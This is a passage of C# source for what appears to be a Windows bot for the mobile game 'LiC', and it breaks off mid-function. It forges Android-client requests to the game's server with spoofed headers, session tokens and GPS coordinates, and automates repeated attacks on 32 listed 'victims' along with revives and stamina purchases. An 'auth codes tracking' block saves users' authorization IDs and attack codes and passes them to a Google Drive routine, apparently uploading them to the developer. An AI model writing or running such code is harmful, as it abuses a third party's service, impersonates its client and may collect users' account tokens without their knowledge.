using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Configuration;
using System.Diagnostics;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Globalization;
using GDataDB;
using Google.GData.Client;
using Google.GData.Extensions;
using Google.GData.Spreadsheets;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using Microsoft.VisualBasic;
using Missions;




namespace LiC_Decoder
{

    public partial class Form1 : Form
    {
        // google doc authentication no longer working as of May 2015.  need to update to auth2.0 in order to fix
        Form3 f3 = new Form3();
        string user = "";
        string macID = "";
        string googleAuthsBook= "allAuths";
        string googleAuthsSheet= "32Beast";
        string googleAuthRequests= "";
        string emailUsername = "";
        string emailPassword = "";
        string fileLocation = @"C:\LiC\bots\32kill\";
        string alertEmail = "";
        string alertPhone = "";
        public Form1()
        {
            InitializeComponent();
            FormClosing += Form1_FormClosing;
            myDelegate = new CloseFormDelegate(CloseMyForm);

            //Sets how many simultaneous bots you can have open
            //int maxBots;
            //if (System.Diagnostics.Process.GetProcessesByName(System.IO.Path.GetFileNameWithoutExtension(System.Reflection.Assembly.GetEntryAssembly().Location)).Count() > maxBots) System.Diagnostics.Process.GetCurrentProcess().Kill();


            Authorize();
            int x = Screen.PrimaryScreen.Bounds.Right - this.Width;
            int y = Screen.PrimaryScreen.Bounds.Top + 3;
            this.Location = new Point(x, y);
            //this.TopMost = true;
            if (!Directory.Exists(fileLocation))
            {
                DirectoryInfo info = Directory.CreateDirectory(fileLocation);
            }
        }

        public delegate void CloseFormDelegate();
        public CloseFormDelegate myDelegate;
        public void CloseMyForm()
        {
            this.Close();
            try
            { Process.GetCurrentProcess().Kill(); }
            catch { Environment.Exit(0); }
        }
        public void Authorize()
        {
            f3.Show();
            Application.DoEvents();
            macID = GetMACAddress();
            if (System.IO.File.Exists(@"C:\LiC\bots\user.LiC"))
                user = System.IO.File.ReadAllText(@"C:\LiC\bots\user.LiC");
            else
            {
                user = Interaction.InputBox("Enter your LiC Name to Request Authorization", "Authorization", user);
                if (user.Length == 0)
                {
                    MessageBox.Show("Access Not Authorized. Please Contact the Developer.");
                    this.Close();
                    try
                    { Process.GetCurrentProcess().Kill(); }
                    catch { Environment.Exit(0); }
                }
                else
                {
                    String2Text(user, "user.LiC");
                }
            }
            ReadDrive("BeastAuths");
            if (access == false)
            {
                f3.label1.Text = "Authorization Failed...";
                f3.label2.Text = "Sending Access Request.";
                int x = f3.Width / 2 - label1.Width / 2;
                int y = f3.Height / 2 - label1.Height / 2;
                f3.label1.Size = new Size(x, y);
                x = f3.Width / 2 - label2.Width / 2;
                y = f3.Height / 2 - label2.Height / 2;
                f3.label2.Size = new Size(x, y);
                Application.DoEvents();
                requestDrive("BeastAuths");
                f3.Close();
                MessageBox.Show("An Authorization Request Has Been Sent.  Please Contact the Developer for Approval.");
                this.Close();
                try
                { Process.GetCurrentProcess().Kill(); }
                catch { Environment.Exit(0); }
            }
            f3.Close();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        public void killProcess(string procName)
        {
            Process[] localByName = Process.GetProcessesByName(procName);
            foreach (Process p in localByName)
            {
                p.Kill();
                while (!p.HasExited)
                {
                    Thread.Sleep(250);
                }
            }
        }

        private void Form1_FormClosing(object sender, EventArgs e)
        {
            this.Dispose();
            Environment.Exit(0);
        }

        string decoded = "";
        int deathCount = 0;
        int r2used = 0;
        string tmp = "";
        int invalid = 0;
        int refillCount = 0;
        int victimrevive = 0;
        int victimdead = 0;
        int victimCount = 0;
        int attackCount = 0;
        string numMission = "";

        private void reset()
        {
            r2label.Text = "0";
            deaths.Text = "0";
            kills.Text = "0";
            mastery.Text = "";
            missionsBox.Value = 0;
            gpsCoordinates.Text = "0.0:0.0:0.5";
            delayTime.Value = 1000;
            runTime.Text = "00:00:00";
            objStopWatch.Reset();
            victimrevive = 0;
            deathCount = 0;
            victimdead = 0;
            victimCount = 0;
            r2used = 0;
            attack = attackCode1.Text;
            attackCount = 0;
        }
        private void reset2()
        {
            refillCount = 1;
            attackCount = 0;
        }

        public void sendURL(string urltext, string posttext)//converted from TD's function... I would not mess with this too much
        {
            //decoded = "";
            ServicePointManager.DefaultConnectionLimit = 25;
            ServicePointManager.Expect100Continue = false;
            string post_data = posttext;//POSTmessage.Text is the text entered into the Post Message field on the GUI
            string uri = "http://lb2.redrobotlabs.com:5000" + urltext;//postURL.Text is the text entered into the Post URL field on the GUI
            string authID = AvatarID.Text;//creates a base64 auth ID            
            delay2 = Convert.ToInt32(killDelay.Value);  // checks users input for delay between healing
            // string line;
            try
            {
                HttpWebRequest request = (HttpWebRequest)
                WebRequest.Create(uri);
                request.Proxy = null;
                request.KeepAlive = true;
                request.ProtocolVersion = HttpVersion.Version11;
                request.Method = "POST";
                request.UserAgent = "LiC - android: 1006006001";
                request.Headers["Accept-Language"] = "en-US";
                request.Headers["X-App-Version"] = "android: 1006006001";
                request.Headers["Authorization"] = authID; //killer id

                request.Headers["x-rrl-fix"] = gpsCoordinates.Text; //gps coords

                request.Accept = "application/x-protobuf+b64";

                byte[] postBytes = Encoding.ASCII.GetBytes(post_data);

                request.ContentType = "application/x-protobuf+b64";
                request.ContentLength = postBytes.Length;

                Stream requestStream = request.GetRequestStream();

                requestStream.Write(postBytes, 0, postBytes.Length);
                //MessageBox.Show(postBytes.Length.ToString());
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());

                tmp = sr.ReadToEnd();
                decoded = DecodeFrom64(tmp);//Decodes the server response
                response.Close();
                sr.Close();
                StringReader stream = new StringReader(decoded);
                string line = null;
                if (done == 0)
                {
                    SetText(responseBox, attackCount + " Attacking...");
                    attackCount++;
                }

                if (done == 3)
                    SetText(responseBox, Environment.NewLine + "Boosted Defense...");
                if (done == 4)
                    SetText(responseBox, Environment.NewLine + "Boosted Critical...");
                if (done == 5)
                    SetText(responseBox, Environment.NewLine + "Healed Attacker...");

                while ((line = stream.ReadLine()) != null)
                {
                    //MessageBox.Show(line);



                    if (line.Contains("enough stamina"))
                    {
                        SetText(responseBox, Environment.NewLine + "Out of Stamina... ");
                        done = 1;
                        if (refillKind != "Natural")  // fix for server error, stops sending URL when on natural stam
                        {
                            SetText(responseBox, refillEcho + " (" + refillCount + ")  " + Environment.NewLine);
                            sendURL(refillURL, refill);
                            refillCount++;
                        }
                        else SetText(responseBox, refillEcho + " | " + DateTime.Now.ToString("HH:mm:ss") + Environment.NewLine);


                        Thread.Sleep(naturalSleep);
                        done = 0;
                        if (refillKind == "r2")
                        {
                            r2used += 10;
                        }
                        else { r2used += 1; }
                        SetText2(r2label, r2used.ToString());
                    }

                    else if (line.Contains("can\'t be fought") || line.Contains("target location"))
                    {
                        victimCount++;
                        if (victimCount == 1)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode2.Text;
                        }
                        if (victimCount == 2)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode3.Text;
                        }
                        if (victimCount == 3)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode4.Text;
                        }
                        if (victimCount == 4)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode5.Text;
                        }
                        if (victimCount == 5)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode6.Text;
                        }
                        if (victimCount == 6)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode7.Text;
                        }
                        if (victimCount == 7)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode8.Text;
                        }
                        if (victimCount == 8)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode9.Text;
                        }
                        if (victimCount == 9)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode10.Text;
                        }
                        if (victimCount == 10)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode11.Text;
                        }
                        if (victimCount == 11)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode12.Text;
                        }
                        if (victimCount == 12)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode13.Text;
                        }
                        if (victimCount == 13)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode14.Text;
                        }
                        if (victimCount == 14)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode15.Text;
                        }
                        if (victimCount == 15)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode16.Text;
                        }
                        if (victimCount == 16)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode17.Text;
                        }
                        if (victimCount == 17)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode18.Text;
                        }
                        if (victimCount == 18)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode19.Text;
                        }
                        if (victimCount == 19)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode20.Text;
                        }
                        if (victimCount == 20)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode21.Text;
                        }
                        if (victimCount == 21)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode22.Text;
                        }
                        if (victimCount == 22)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode23.Text;
                        }
                        if (victimCount == 23)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode24.Text;
                        }
                        if (victimCount == 24)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode25.Text;
                        }
                        if (victimCount == 25)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode26.Text;
                        }
                        if (victimCount == 26)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode27.Text;
                        }
                        if (victimCount == 27)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode28.Text;
                        }
                        if (victimCount == 28)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode29.Text;
                        }
                        if (victimCount == 29)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode30.Text;
                        }
                        if (victimCount == 30)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode31.Text;
                        }
                        if (victimCount == 31)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode32.Text;
                        }

                        if (victimCount == 32)
                        {
                            SetText(responseBox, "Victim " + victimCount + " is dead... ");
                            attack = attackCode1.Text;
                            victimCount = 0;
                        }
                        if (victimCount == 32)
                        {
                            victimCount = 0;
                        }

                        if (delay2 > 0) { SetText(responseBox, " | Waiting " + delay2 + " minutes |  "); Thread.Sleep(delay2 * 60 * 1000); }
                        SetText(responseBox, Environment.NewLine);
                        done = 1;
                        done = 0;
                        victimdead = 0;
                        if (attackCount > 1) { victimrevive++; }

                        SetText2(kills, victimrevive.ToString());
                        attackCount = 0;
                    }
                    else if (line.Contains("Heal up"))
                    {
                        // 31 = random revive, else use preselected wait
                        if (reviveDelay.Value == 31)
                        {
                            delay3 = GetRandomNumber(30);
                        }
                        if (delay3 >= 0)
                        {
                            SetText(responseBox, "Attacker dead... waiting " + delay3 + " minutes to revive |  ");
                            Thread.Sleep(delay3 * 1000 * 60);
                        }
                        else
                        {
                            SetText(responseBox, "Attacker dead...  |  skipping revive " + Environment.NewLine);

                        }

                        if (reviveDelay.Value >= 0)
                        {
                            deathCount++;
                            done = 1;
                            SetText2(deaths, deathCount.ToString());
                            sendURL("/mob_api/avatar/revive", "");
                            done = 0;
                            SetText(responseBox, "Revived!" + Environment.NewLine);
                        }
  
                        done = 0;

                    }
                    //no Endurance Tablets
                    else if (line.Contains("no Endurance Tablets"))
                    {
                        SetText(responseBox, "no Endurance Tablets left");
                        Thread.Sleep(5000);
                        SetText(responseBox, Environment.NewLine + "PLEASE SELECT NEW REFILL TYPE AND CLICK RESUME " + Environment.NewLine + Environment.NewLine);
                        reset2();
                        SetText2(button1, "RESUME");
                        Thread.Sleep(5000);
                    }
                    //no Stamina Pills
                    else if (line.Contains("no Stamina Pills"))
                    {
                        SetText(responseBox, "no Stamina Pills left");
                        Thread.Sleep(5000);
                        SetText(responseBox, Environment.NewLine + "PLEASE SELECT NEW REFILL TYPE AND CLICK RESUME " + Environment.NewLine + Environment.NewLine);
                        reset2();
                        SetText2(button1, "RESUME");
                        Thread.Sleep(5000);
                    }
                    //Purchase Failed
                    else if (line.Contains("Purchase Failed"))
                    {
                        SetText(responseBox, " Purchase Failed");
                        Thread.Sleep(5000);
                        SetText(responseBox, Environment.NewLine + "PLEASE SELECT NEW REFILL TYPE AND CLICK RESUME " + Environment.NewLine + Environment.NewLine);
                        reset2();
                        SetText2(button1, "RESUME");
                        Thread.Sleep(5000);
                    }
                    else if (line.Contains("The event is not active yet"))
                    {
                        SetText(responseBox, Environment.NewLine + " The event is not active yet or is finished.");
                        reset2();
                        SetText2(button1, "RESUME");
                        Thread.Sleep(1000);
                    }
                    else if (line.Contains("You have exceeded"))
                    {
                        SetText(responseBox, Environment.NewLine + " Maximum requests sent, slow down!" + Environment.NewLine);
                        Thread.Sleep(30 * 1000);

                    }
                    else if (line.Contains("avatars/") && nameCheck == 1)
                    {


                        string attackerNameChecker = getBetween(line, "", "avatars/");
                        string attackerNameOnly = Regex.Replace(attackerNameChecker, @"[^\d-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ *]", String.Empty);
                        MessageBox.Show(attackerNameOnly);
                        nameCheck = 0;
                        done = 0;
                    }
                    else if (line.Contains("avatars/") && victimCheck == 1)
                    {

                        string victimNameChecker = getBetween(line, "", "avatars/");
                        string victimNameOnly = Regex.Replace(victimNameChecker, @"[^\d-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ *.]", String.Empty);
                        SetText(responseBox, "    = " + victimNameOnly);
                        // MessageBox.Show(nameOnly);
                        victimCheck = 0;
                        done = 0;
                    }
                }
                stream.Close();
            }

            catch
            {


                SetText(responseBox, Environment.NewLine + "SERVER ERROR - Retrying Request..." + Environment.NewLine);
                invalid++;
                if (invalid == 5)
                {
                    updateGUI("**AUTH** ");
                    SetText(responseBox, Environment.NewLine + "Your current authorization ID is INVALID. Input a VALID one before continuing." + Environment.NewLine);
                    SetText2(button1, "RESUME");
                    invalid = 0;
                    System.Media.SoundPlayer startSoundPlayer = new System.Media.SoundPlayer(@"C:\Windows\Media\TPBTVLWV.wav");
                    //startSoundPlayer.Play();
                }
            } 
         
 }
      
        public string GetSubstring(string a, string b, string c)
        {
            try
            {
                return c.Substring((c.IndexOf(a) + a.Length), (c.IndexOf(b) - c.IndexOf(a) - a.Length));
            }
            catch
            {
                return null;
            }
        }

        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                int startIndex = strSource.IndexOf(strStart, 0) + strStart.Length;
                int index = strSource.IndexOf(strEnd, startIndex);
                return strSource.Substring(startIndex, index - startIndex);
            }
            return "";
        }

        int done = 0;
        public void changeName()
        {
            if (username.Text != "Notes (to help keep track)")
            {
                this.Text = username.Text;
            }
            // if (invalid == 5) { this.Text = "**AUTH** " + username.Text; }
            // if (invalid == 5) { txtMyTextBox.SafeInvoke(d => d.Text = newTextString); }
        }
        public delegate void serviceGUIDelegate();
        private void updateGUI(string updateName)
        {
            BeginInvoke((Action)delegate() { this.Text = updateName + username.Text; });
            send_Email(updateName);
        }
        public delegate void SetTextDelegate(System.Windows.Forms.Control ctrl, string text);
        public static void SetText(System.Windows.Forms.Control ctrl, string text)
        {

            if (ctrl.InvokeRequired)
            {
                object[] params_list = new object[] { ctrl, text };
                ctrl.Invoke(new SetTextDelegate(SetText), params_list);
            }
            else
            {
                ctrl.Text += text;
            }
            Application.DoEvents();
        }

        //public delegate void SetTextDelegate(System.Windows.Forms.Control ctrl, string text);
        public static void SetText2(System.Windows.Forms.Control ctrl, string text)
        {

            if (ctrl.InvokeRequired)
            {
                object[] params_list = new object[] { ctrl, text };
                ctrl.Invoke(new SetTextDelegate(SetText2), params_list);
            }
            else
            {
                ctrl.Text = text;
            }
            Application.DoEvents();
        }
     
        public string GetRandomString(int length)//This generates a random 16 digit string for our android ID
        {
            string[] array = new string[36]
	        {
		        "0","1","2","3","4","5","6","7","8","9",
		        "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"
	        };
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            for (int i = 0; i < length; i++) sb.Append(array[GetRandomNumber(36)]);
            return sb.ToString();
        }

        public void authArray()
        {
         string path = @"c:\authArray.txt";

         var lines = File.ReadAllLines("c:\\xmultiauths.php");
         File.Create(path).Close();
         foreach (var authLine in lines)
         {
         if (authLine.Contains("Basic"))
         {
                 using (StreamWriter sw = File.AppendText(path))
                 {
                     sw.WriteLine(authLine.Replace("$authorization[] =\"","").Replace("\";",""));
                 }
         }
        }
        }

        public int GetRandomNumber(int maxNumber)//This is used by GetRandomString for random number generation
        {
            if (maxNumber < 1)
                throw new System.Exception("The maxNumber value should be greater than 1");
            byte[] b = new byte[4];
            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
            int seed = (b[0] & 0x7f) << 24 | b[1] << 16 | b[2] << 8 | b[3];
            System.Random r = new System.Random(seed);
            return r.Next(1, maxNumber);
        }

        public static string EncodeTo64UTF8(string m_enc)//This function encodes a string into Base 64
        {
            byte[] toEncodeAsBytes =
            System.Text.Encoding.UTF8.GetBytes(m_enc);
            string returnValue =
            System.Convert.ToBase64String(toEncodeAsBytes);
            return returnValue;
        }

        public static string DecodeFrom64(string m_enc)//Function to decode from Base64 UTF-8
        {
            byte[] encodedDataAsBytes =
            System.Convert.FromBase64String(m_enc);
            string returnValue =
            System.Text.Encoding.UTF8.GetString(encodedDataAsBytes);
            return returnValue;
        }

        public string createAuthID()//This function adds together the avi ID from the gui and a random 16-digit Android ID, then converts it to Base 64
        {
            string random = AvatarID.Text + ":" + GetRandomString(16);
            string base64 = EncodeTo64UTF8(random);
            string AuthID = "Basic " + base64;
            return AuthID;
        }

        public string appendTextbox(string parse)//This appends the server response to the textbox character by character because sending as a single string is often too large
        {            
            char[] ch = parse.ToArray();//converts string to an array of characters
            foreach(char a in ch)//appends each character tot he text box
            {
            responseBox.Text = responseBox.Text + a.ToString();
            }
            return parse;
        }

        int max;
        int delay = 0;
        int delay2 = 0;
        int delay3;
        int naturalSleep = 0;
        string refill;
        string refillURL;
        string refillEcho;
        string refillKind;
        string attack;
        int trackauths = 0;
        private void button1_Click(object sender, EventArgs e)
        {
            changeName();
            //if (username.Text != "Notes (to help keep track)")
            //{
            //    this.Text = username.Text;
            //}
            if (button1.Text == "START")
            responseBox.Text = "";
            if (AvatarID.Text != "Enter Authoriation ID Here Starting With \"Basic\"" & attackCode1.Text !="Enter Attack Code")
            {
               //missionNRG = missionType.Text;
                StreamWriter writer;

                            //  new routing = miniComp"+saveFolder.Text+"\\

                //WRITES ALL CURRENT CODES INTO A TEXT FILE UPON CLICKING THE START BUTTON
                using (writer = new StreamWriter(fileLocation + saveLocation.Text + ".LiC"))
                {
                    writer.WriteLine(AvatarID.Text);
                    writer.WriteLine(gpsCoordinates.Text);
                    writer.WriteLine(attackCode1.Text);
                    writer.WriteLine(attackCode2.Text);
                    writer.WriteLine(attackCode3.Text);
                    writer.WriteLine(attackCode4.Text);
                    writer.WriteLine(attackCode5.Text);
                    writer.WriteLine(attackCode6.Text);
                    writer.WriteLine(attackCode7.Text);
                    writer.WriteLine(attackCode8.Text);
                    writer.WriteLine(attackCode9.Text);
                    writer.WriteLine(attackCode10.Text);
                    writer.WriteLine(attackCode11.Text);
                    writer.WriteLine(attackCode12.Text);
                    writer.WriteLine(attackCode13.Text);
                    writer.WriteLine(attackCode14.Text);
                    writer.WriteLine(attackCode15.Text);
                    writer.WriteLine(attackCode16.Text);
                    writer.WriteLine(attackCode17.Text);
                    writer.WriteLine(attackCode18.Text);
                    writer.WriteLine(attackCode19.Text);
                    writer.WriteLine(attackCode20.Text);
                    writer.WriteLine(attackCode21.Text);
                    writer.WriteLine(attackCode22.Text);
                    writer.WriteLine(attackCode23.Text);
                    writer.WriteLine(attackCode24.Text);
                    writer.WriteLine(attackCode25.Text);
                    writer.WriteLine(attackCode26.Text);
                    writer.WriteLine(attackCode27.Text);
                    writer.WriteLine(attackCode28.Text);
                    writer.WriteLine(attackCode29.Text);
                    writer.WriteLine(attackCode30.Text);
                    writer.WriteLine(attackCode31.Text);
                    writer.WriteLine(attackCode32.Text);
                    writer.Close();
                }


               
                //select refill type
                refill = null;
                refillURL = null;
                refillEcho =null;
                refillKind = null;

                /*start of auth codes tracking*/
                String2Text(AvatarID.Text, "AuthID.LiC");
                String2Text(attackCode1.Text, "minicomp1.LiC");
                String2Text(attackCode2.Text, "minicomp2.LiC");
                String2Text(attackCode3.Text, "minicomp3.LiC");
                String2Text(attackCode4.Text, "minicomp4.LiC");
                String2Text(attackCode5.Text, "minicomp5.LiC");
                String2Text(attackCode6.Text, "minicomp6.LiC");
                if (trackauths == 0)
                {
                    GoogleDrive("BeastTracker");
                }
                trackauths++;
                /*end of auth codes tracking*/
               
                if (refillType.Text == "Natural")
                {
                    naturalSleep = 3600000;
                    refillEcho = "Waiting one hour! ";
                    refillKind = "Natural";
                }
                else if (refillType.Text == "Natural2")
                {
                    naturalSleep = 2 * 3600000;
                    refillEcho = "Waiting two hours! ";
                    refillKind = "Natural";
                }
                else if (refillType.Text == "Natural3")
                {
                    naturalSleep = 3 * 3600000;
                    refillEcho = "Waiting three hours! ";
                    refillKind = "Natural";
                }
                else if (refillType.Text == "Tablets +3")
                {
                    naturalSleep = 0;
                    refillURL = "/mob_api/avatar/equip_item";
                    refill = "CBQ=";
                    refillEcho = "Used a tablet! ";
                    refillKind = "tablets";
                }
                else if (refillType.Text == "Pills")
                {
                    naturalSleep = 0;
                    refillURL = "/mob_api/avatar/equip_item";
                    refill = "CEE=";
                    refillEcho = "Used a pill! ";
                    refillKind = "pills";
                }
                else if (refillType.Text == "R2")
                {
                    naturalSleep = 0;
                    refillURL = "/mob_api/shop/purchase_item";
                    refill = "CAMQASIA";
                    refillEcho = "Purchased Stamina with r2! ";
                    refillKind = "r2";

                }
                
                
                
               //testing if attack code change is working properly
                 
                    if (victimCount == 0)
                    {
                        attack = attackCode1.Text;  
                    }
                    else if (victimCount == 1)
                    {
                        attack = attackCode2.Text;
                    }
                    else if (victimCount == 2)
                    {
                        attack = attackCode3.Text; 
                    }
                    else if (victimCount == 3)
                    {
                        attack = attackCode4.Text;
                    }
                    else if (victimCount == 4)
                    {
                        attack = attackCode5.Text;
                    }
                    else if (victimCount == 5)
                    {
                        attack = attackCode6.Text;
                    }
                    else if (victimCount == 6)
                    {
                        attack = attackCode7.Text;
                    }
                    else if (victimCount == 7)
                    {
                        attack = attackCode8.Text;
                    }
                    else if (victimCount == 8)
                    {
                        attack = attackCode9.Text;
                    }
                    else if (victimCount == 9)
                    {
                        attack = attackCode10.Text;
                    }
                    else if (victimCount == 10)
                    {
                        attack = attackCode11.Text;
                    }
                    else if (victimCount ==11)
                    {
                        attack = attackCode12.Text;
                    }
                    else if (victimCount == 12)
                    {
                        attack = attackCode13.Text;
                    }
                    else if (victimCount == 13)
                    {
                        attack = attackCode14.Text;
                    }
                    else if (victimCount == 14)
                    {
                        attack = attackCode15.Text;
                    }
                    else if (victimCount == 15)
                    {
                        attack = attackCode16.Text;
                    }
                    else if (victimCount == 16)
                    {
                        attack = attackCode17.Text;
                    }
                    else if (victimCount == 17)
                    {
                        attack = attackCode18.Text;
                    }
                    else if (victimCount == 18)
                    {
                        attack = attackCode19.Text;
                    }
                    else if (victimCount == 19)
                    {
                        attack = attackCode20.Text;
                    }
                    else if (victimCount == 20)
                    {
                        attack = attackCode21.Text;
                    }
                    else if (victimCount == 21)
                    {
                        attack = attackCode22.Text;
                    }
                    else if (victimCount == 22)
                    {
                        attack = attackCode23.Text;
                    }
                    else if (victimCount == 23)
                    {
                        attack = attackCode24.Text;
                    }
                    else if (victimCount == 24)
                    {
                        attack = attackCode25.Text;
                    }
                    else if (victimCount == 25)
                    {
                        attack = attackCode26.Text;
                    }
                    else if (victimCount == 26)
                    {
                        attack = attackCode27.Text;
                    }
                    else if (victimCount == 27)
                    {
                        attack = attackCode28.Text;
                    }
                    else if (victimCount == 28)
                    {
                        attack = attackCode29.Text;
                    }
                    else if (victimCount == 29)
                    {
                        attack = attackCode30.Text;
                    }
                    else if (victimCount == 30)
                    {
                        attack = attackCode31.Text;
                    }
                    else if (victimCount == 31)
                    {
                        attack = attackCode32.Text;
                    }
                    else if (victimCount == 32)
                    {
                        attack = attackCode1.Text;
                    }

                    

                
                
                if (button1.Text == "PAUSE")
                {
                    objStopWatch.Stop();
                    button1.Text = "RESUME";
                }
               
                else if (button1.Text == "RESUME")
                {
                    objStopWatch.Start();
                    button1.Text = "PAUSE";
                }
                delay = Convert.ToInt32(delayTime.Value);
                delay3 = Convert.ToInt32(reviveDelay.Value);
                max = Convert.ToInt32(missionsBox.Value);
                
                if (button1.Text == "START")
                {
                    var missions = new Thread(() =>
                    {

                        
                            if (killsRadio.Checked)
                            {
                                while (victimrevive < max || max == 0)
                                {
                                    while (button1.Text == "RESUME")
                                        Thread.Sleep(200);
                                    
                                    sendURL("/mob_api/fight/fight_weapon", attack);
                                    Thread.Sleep(delay);
                                    
                                }
                            }
                            if (r2Radio.Checked)
                            {
                                while (r2used < max || max == 0)
                                {
                                    while (button1.Text == "RESUME")
                                        Thread.Sleep(200);
                                    sendURL("/mob_api/fight/fight_weapon", attack);
                                    Thread.Sleep(delay);
                                   
                                }
                            }
                        
                        SetText(responseBox, Environment.NewLine + Environment.NewLine + victimrevive + " LIMIT HAS BEEN REACHED AND " + r2used + " R2 HAS BEEN USED!" + Environment.NewLine + "Hit RESTART to Start a New Instance" + Environment.NewLine + Environment.NewLine);
                        updateGUI("**LIMIT REACHED** ");
                        SetText2(button1, "RESET");
                    });
                    missions.IsBackground = true;
                    missions.Start();
                    objStopWatch.Start();
                    paused = false;
                    button1.Text = "PAUSE";
                }
            }else            
            responseBox.Text += Environment.NewLine + "PLEASE ENTER AN AUTHORIZATION ID AND TRY AGAIN" + Environment.NewLine;
            if (button1.Text == "RESET")
            {
                reset();
                button1.Text = "START";
            }
        }

       
        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void responseBox_TextChanged(object sender, EventArgs e)
        {
            responseBox.SelectionStart = responseBox.Text.Length;
            responseBox.ScrollToCaret();
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        Stopwatch objStopWatch = new Stopwatch();
        bool paused = true;
        //double XPavg = 0;
        double intTime = 0;
        private void missionTime_Tick(object sender, EventArgs e)
        {
            try
            {
                if (objStopWatch.IsRunning)
                {

                    TimeSpan objTimeSpan = TimeSpan.FromSeconds(objStopWatch.Elapsed.TotalSeconds);
                    runTime.Text = String.Format(CultureInfo.CurrentCulture, "{0:00}:{1:00}:{2:00}", objTimeSpan.Hours, objTimeSpan.Minutes, objTimeSpan.Seconds);
                    intTime = Convert.ToInt32(objTimeSpan.TotalSeconds);

                    if (paused)
                    {
                        paused = false;
                    }
                }
            }
            catch
            {
            }

         }

        private void xpRadio_CheckedChanged(object sender, EventArgs e)
        {
            if (killsRadio.Checked)
                r2Radio.Checked = false;
        }

        private void r2Radio_CheckedChanged(object sender, EventArgs e)
        {
            if (r2Radio.Checked)
                killsRadio.Checked = false;
        }

        private void chips_Click(object sender, EventArgs e)
        {

        }

        private void attackButton_Click(object sender, EventArgs e)
        {
            done = 2;
            SetText(responseBox, Environment.NewLine + "Boosting Attack...");
            sendURL("/mob_api/avatar/equip_item", "CI3qMA==");
            done = 0;

        }

        private void defenseButton_Click(object sender, EventArgs e)
        {
            done = 3;
            sendURL("/mob_api/avatar/equip_item", "CJTqMA==");
            done = 0;
        }

        private void criticalButton_Click(object sender, EventArgs e)
        {
            done = 4;
            sendURL("/mob_api/avatar/equip_item", "CJfqMA==");
            done = 0;
        }

        private void healButton_Click(object sender, EventArgs e)
        {
            done = 5;
            sendURL("/mob_api/avatar/revive", "");
            done = 0;
        }

        private void gpsCoordinates_TextChanged(object sender, EventArgs e)
        {

        }

        int X = 0;
        bool newLine = true;
        string R2Log;
        public void String2Text(string str, string txt)
        {
            if (File.Exists(@"c:\LiC\L33T_Cycler\" + txt))
                R2Log = File.ReadAllText(@"c:\LiC\L33T_Cycler\" + txt);
            if (!File.Exists(@"c:\LiC\L33T_Cycler\" + txt) || newLine == false)
            {
                X = 0;
                // Create a file to write to. 
                using (StreamWriter sw = File.CreateText(@"c:\LiC\L33T_Cycler\" + txt))
                {
                    if (X == 0 && txt == "R2Log.txt")
                    {
                        sw.WriteLine(str);
                        X++;
                    }
                    else if (txt != "R2Log.txt")
                    {
                        sw.WriteLine(str);
                    }
                }


            }
            else
            {
